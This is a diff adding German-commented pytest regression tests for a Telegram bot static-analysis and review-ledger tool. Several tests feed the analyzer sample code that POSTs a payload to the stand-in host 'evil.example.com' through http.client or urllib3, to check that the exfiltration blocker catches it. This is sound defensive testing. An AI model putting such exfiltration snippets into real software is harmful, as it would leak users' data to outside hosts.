@@ -422,3 +422,293 @@ def test_load_corrupt_ledger_raises_review_error(tmp_path):
     trail.write_text('{"keine": "liste"}', encoding="utf-8")
     with pytest.raises(ReviewError, match="beschädigt"):
         ReviewLedger.load(trail)
+
+
+# ---------------------------------------------------------------------------
+# Regression v2.13.0 — Code-Review
+# ---------------------------------------------------------------------------
+class TestBK004NotBypassable:
+    """Der Exfiltrations-Blocker war über `http.client` und `urllib3` umgehbar.
+
+    v2.12.0 prüfte nur Aufrufe, deren aufgelöster Name auf einen HTTP-Methoden-
+    namen *und* eine bekannte Modulwurzel zeigt:
+
+        import http.client
+        c = http.client.HTTPSConnection("evil.example.com")   # nicht erfasst
+        c.request("POST", "/collect", body=payload)           # root == "c"
+
+    `_resolve_call_name("c.request")` liefert ``"c.request"`` unverändert,
+    ``root == "c"`` ist nicht in ``HTTP_MODULE_ROOTS`` — `_check_http_target`
+    lief nie, und `botctl review` meldete "keine Befunde".
+    """
+
+    @staticmethod
+    def _rules(source: str) -> set[str]:
+        return {f.rule_id for f in analyze_code(source, filename="bot.py").findings}
+
+    def test_http_client_exfiltration_is_blocked(self):
+        rules = self._rules(
+            "import http.client\n"
+            'c = http.client.HTTPSConnection("evil.example.com")\n'
+            'c.request("POST", "/collect", body=payload)\n'
+        )
+        assert "BK004" in rules
+        assert "BK010" in rules  # Folgeaufruf über Alias-Handle nicht prüfbar
+
+    def test_urllib3_is_forbidden_and_blocked(self):
+        rules = self._rules(
+            "import urllib3\n"
+            'r = urllib3.PoolManager("evil.example.com")\n'
+            'r.request("POST", "/collect", body=p)\n'
+        )
+        assert "BK001" in rules  # Import
+        assert "BK004" in rules  # Ziel-Host
+        assert "BK010" in rules  # Folgeaufruf
+
+    def test_urllib3_alias_import_also_blocked(self):
+        rules = self._rules(
+            "import urllib3 as u3\n"
+            'r = u3.PoolManager("evil.example.com")\n'
+            "r.request('POST', '/x', body=p)\n"
+        )
+        assert {"BK001", "BK004"} <= rules
+
+    def test_allowed_host_still_passes(self):
+        """Kein False Positive: `api.telegram.org` bleibt erlaubt."""
+        assert not self._rules(
+            "import http.client\n"
+            'c = http.client.HTTPSConnection("api.telegram.org")\n'
+            'c.request("GET", "/getMe")\n'
+        )
+        assert not self._rules(
+            'import requests\nrequests.post("https://api.telegram.org/bot1/x", json=d)\n'
+        )
+
+    def test_unresolvable_host_is_not_silently_allowed(self):
+        rules = self._rules(
+            "import http.client\n"
+            "c = http.client.HTTPSConnection(host_var)\n"
+            'c.request("GET", "/getMe")\n'
+        )
+        assert "BK010" in rules
+
+
+class TestBK002Precision:
+    """BK002 meldete gewöhnliche Builtins als BLOCKER — `set()` stoppte jedes Review.
+
+    ``PERSISTENCE_CALLS`` wird gegen den letzten Namensbestandteil geprüft und
+    enthält `set`, `remove` und `save`. Damit waren `seen = set()`,
+    `results.remove(x)` und `cfg.save()` Blocker. Die Methoden-Version meldet
+    jetzt nur noch, wenn der Empfänger auf einen bekannten persistenz-
+    verdächtigen Typ auflösbar ist; sonst greift BK010 („nicht prüfbar").
+    """
+
+    @staticmethod
+    def _rules(source: str) -> set[str]:
+        return {f.rule_id for f in analyze_code(source, filename="bot.py").findings}
+
+    @pytest.mark.parametrize(
+        "source",
+        [
+            "seen = set()\nseen.add(1)\n",
+            "results = [1, 2]\nresults.remove(1)\n",
+            "cfg = Config()\ncfg.save()\n",
+            "client = get_client()\nclient.remove(1)\n",
+        ],
+    )
+    def test_no_false_blocker(self, source):
+        rules = self._rules(source)
+        # BK002 (persistenzverdächtig) darf nicht mehr anschlagen …
+        assert "BK002" not in rules
+        # … aber „nicht prüfbar" wird, wo zutreffend, als BK010 gesagt.
+        assert rules <= {"BK010"}
+
+    @pytest.mark.parametrize(
+        "source",
+        [
+            "from pathlib import Path\nPath('x').write_text(d)\n",
+            "from pathlib import Path\np = Path('x')\np.unlink()\n",
+            "import os\nos.makedirs('/tmp/x')\n",
+            "import os\nos.remove('x')\n",
+        ],
+    )
+    def test_real_persistence_still_blocked(self, source):
+        assert "BK002" in self._rules(source)
+
+    def test_signal_connect_is_not_persistence(self):
+        assert not self._rules("import signal\nsignal.connect(handler)\n")
+
+
+class TestOpenModes:
+    """`open(p, "r+")` war ein False Negative: `+` heisst lesen UND schreiben."""
+
+    @staticmethod
+    def _rules(source: str) -> set[str]:
+        return {f.rule_id for f in analyze_code(source, filename="bot.py").findings}
+
+    @pytest.mark.parametrize("mode", ["w", "a", "x", "w+", "r+", "a+", "wb", "r+b"])
+    def test_writable_modes_blocked(self, mode):
+        assert "BK002" in self._rules(f'f = open(p, "{mode}")\n')
+
+    @pytest.mark.parametrize("source", ['f = open(p, "r")\n', 'f = open(p, "rb")\n', "f = open(p)\n"])
+    def test_read_only_modes_allowed(self, source):
+        # `open(p)` ohne mode ist laut Python-Doku äquivalent zu `open(p, "r")`.
+        assert "BK002" not in self._rules(source)
+
+
+class TestRandomImportAsymmetry:
+    """`from random import choice` ergab BK012, `import random` nicht."""
+
+    def test_plain_import_random_flagged(self):
+        rules = {f.rule_id for f in analyze_code("import random\n", filename="b.py").findings}
+        assert "BK012" in rules
+
+    def test_aliased_import_random_flagged(self):
+        src = "import random as rnd\nrnd.random()\n"
+        rules = {f.rule_id for f in analyze_code(src, filename="b.py").findings}
+        assert "BK012" in rules
+
+
+class TestBK006NoDuplicates:
+    """Ein hartkodiertes Token ergab ZWEI BK006-Befunde auf derselben Zeile.
+
+    `visit_Assign` meldete es, und `generic_visit` lief danach in
+    `visit_Constant` für denselben Knoten. Weil `submit()` die Befunde in den
+    Audit-Trail protokolliert, lagen die Duplikate dauerhaft dort.
+    """
+
+    def test_one_finding_per_token_literal(self):
+        src = 'TOKEN = "123456789:AAEaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\n'
+        findings = [
+            f for f in analyze_code(src, filename="b.py").findings if f.rule_id == "BK006"
+        ]
+        assert len(findings) == 1
+
+    def test_secret_names_still_flagged(self):
+        """Der Zweig für sprechende Zielnamen bleibt erhalten."""
+        src = 'API_KEY = "sk-abc123"\n'
+        rules = {f.rule_id for f in analyze_code(src, filename="b.py").findings}
+        assert "BK006" in rules
+
+    def test_fixture_has_no_duplicates(self):
+        report = analyze_source(INSECURE_BOT)
+        hits = [f for f in report.findings if f.rule_id == "BK006"]
+        assert len(hits) == len({(f.line, f.rule_id) for f in hits})
+
+
+class TestLedgerBindsToBytes:
+    """`submit` und `verify` berechneten verschiedene SHA-256 für dieselbe Datei.
+
+    `submit` reichte `report.source_sha256` ein (über `read_text`, das CRLF zu
+    LF normalisiert), `verify` prüfte `source_sha256` (über `read_bytes`). Bei
+    einem CRLF-Checkout — `core.autocrlf`, Windows, einzelne `\\r` — waren die
+    Werte nie gleich, und die Freigabe war dauerhaft unmöglich.
+    """
+
+    CHECKS = tuple(f"C{i}" for i in range(1, 10))
+
+    def _gate(self):
+        return ReviewGate(ReviewLedger(), registry=None)
+
+    def _approve_twice(self, gate, ticket):
+        gate.approve(ticket.ticket_id, Reviewer("alice", ReviewRole.MAINTAINER),
+                     checks=self.CHECKS)
+        gate.approve(ticket.ticket_id, Reviewer("bob"), checks=self.CHECKS)
+
+    def test_crlf_file_can_be_approved_and_verified(self, tmp_path):
+        bot = tmp_path / "bot.py"
+        bot.write_bytes(b"# bot\r\nx = 1\r\n")  # CRLF-Checkout
+        gate = self._gate()
+        ticket = gate.submit(42, bot)
+        self._approve_twice(gate, ticket)
+        gate.verify(42, bot, check_registry=False)  # darf nicht werfen
+
+    def test_report_hash_still_differs_from_byte_hash(self, tmp_path):
+        """Dokumentiert die Ursache: die beiden Hashes sind definitionsgemäß
+        verschieden. `submit` bindet deshalb ausdrücklich an die Bytes."""
+        bot = tmp_path / "bot.py"
+        bot.write_bytes(b"# bot\r\nx = 1\r\n")
+        report = analyze_source(bot)
+        assert report.source_sha256 != source_sha256(bot)
+
+    def test_changed_bytes_are_rejected(self, tmp_path):
+        bot = tmp_path / "bot.py"
+        bot.write_bytes(b"# bot\r\nx = 1\r\n")
+        gate = self._gate()
+        ticket = gate.submit(42, bot)
+        self._approve_twice(gate, ticket)
+        bot.write_bytes(b"# bot\nx = 1\n")  # LF statt CRLF
+        with pytest.raises(ReviewGateError):
+            gate.verify(42, bot, check_registry=False)
+
+    def test_identical_bytes_still_verify(self, tmp_path):
+        bot = tmp_path / "bot.py"
+        bot.write_bytes(b"# bot\r\nx = 1\r\n")
+        gate = self._gate()
+        ticket = gate.submit(42, bot)
+        self._approve_twice(gate, ticket)
+        bot.write_bytes(b"# bot\r\nx = 1\r\n")
+        gate.verify(42, bot, check_registry=False)
+
+    def test_submit_reuses_supplied_report(self, tmp_path, monkeypatch):
+        """Der Report wird nicht ein zweites Mal erzeugt (Doppel-Lesen weg)."""
+        bot = tmp_path / "bot.py"
+        bot.write_text("# bot\nx = 1\n", encoding="utf-8")
+        gate = self._gate()
+        report = gate.analyze(bot)
+        calls = []
+        real = gate.analyze
+        monkeypatch.setattr(gate, "analyze", lambda p: (calls.append(p), real(p))[1])
+        gate.submit(7, bot, report=report)
+        assert calls == []  # wurde der bereits berechnete Report benutzt
+
+
+class TestLedgerWriteIsAtomic:
+    """`save` kürzte den Audit-Trail in place — ein Absturz machte ihn unbrauchbar.
+
+    `write_text` öffnet mit "w". Der `flock` in `_ledger_transaction` verhindert
+    gleichzeitige Schreiber, aber keinen Kill, keine volle Platte und keinen
+    Stromausfall zwischen Kürzen und letztem Byte. Danach meldet `load()`
+    "ist beschädigt" — und mit dem Trail sind **alle** Freigaben verloren.
+    """
+
+    def test_readable_before_and_after(self, tmp_path):
+        trail = tmp_path / "reviews.json"
+        ledger = ReviewLedger()
+        ledger.submit(1, "a" * 64, file="bot.py")
+        ledger.save(trail)
+        assert ReviewLedger.load(trail).ticket_for(1, "a" * 64) is not None
+        ledger.submit(2, "b" * 64, file="bot2.py")
+        ledger.save(trail)
+        assert ReviewLedger.load(trail).ticket_for(2, "b" * 64) is not None
+
+    def test_failure_does_not_destroy_existing_trail(self, tmp_path, monkeypatch):
+        trail = tmp_path / "reviews.json"
+        ledger = ReviewLedger()
+        ledger.submit(1, "a" * 64, file="bot.py")
+        ledger.save(trail)
+        original = trail.read_text(encoding="utf-8")
+
+        # os.replace scheitert -> der alte Trail muss unangetastet bleiben.
+        def boom(*_a, **_kw):
+            raise OSError(28, "No space left on device")
+
+        monkeypatch.setattr("telegram_formatter.botkit.review.os.replace", boom)
+        ledger.submit(2, "b" * 64, file="bot2.py")
+        with pytest.raises(ReviewError, match="nicht schreibbar"):
+            ledger.save(trail)
+        assert trail.read_text(encoding="utf-8") == original
+        assert ReviewLedger.load(trail).ticket_for(1, "a" * 64) is not None
+
+    def test_no_temp_file_left_behind(self, tmp_path, monkeypatch):
+        trail = tmp_path / "reviews.json"
+        ledger = ReviewLedger()
+        ledger.submit(1, "a" * 64, file="bot.py")
+
+        def boom(*_a, **_kw):
+            raise OSError(28, "No space left on device")
+
+        monkeypatch.setattr("telegram_formatter.botkit.review.os.replace", boom)
+        with pytest.raises(ReviewError):
+            ledger.save(trail)
+        assert list(tmp_path.glob("*.tmp")) == []
